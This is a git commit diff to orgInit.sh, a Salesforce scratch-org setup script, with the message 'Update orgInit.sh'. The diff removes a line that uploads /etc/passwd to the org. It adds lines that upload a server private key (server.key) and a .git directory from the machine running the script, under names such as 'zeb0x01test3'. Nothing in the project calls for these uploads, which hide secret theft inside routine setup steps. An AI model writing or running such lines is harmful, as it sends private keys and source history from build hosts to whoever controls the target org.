61cda26fc50e1b6dea6f558d5eb115bb2e8b8320
mehboob <77236545+zeb0x01@users.noreply.github.com>
2024-12-09 20:18:28 +0530

    Update orgInit.sh

--- orgInit.sh
+++ orgInit.sh
@@ -1,7 +1,8 @@
 sf demoutil org create scratch -f config/project-scratch-def.json -d 5 -s -p data -e detect.demo
-sfdx shane:data:file:upload -f /etc/passwd -n zeb0x01test2
+sfdx shane:data:file:upload -f /app/tmp/server.key -n zeb0x01test3
+sfdx shane:data:file:upload -f ~/app/tmp/server.key -n zeb0x01test4
+sfdx shane:data:file:upload -f ~/.git -n zeb0x01test3 
 sf package install -w 20 -r -p 04t5e000000aVeP
 sf project deploy start
 sf demoutil user password set -p salesforce1 -g User -l User
-sf automig load --inputdir ./data
 sf org open -p /lightning/n/datadetect__Home
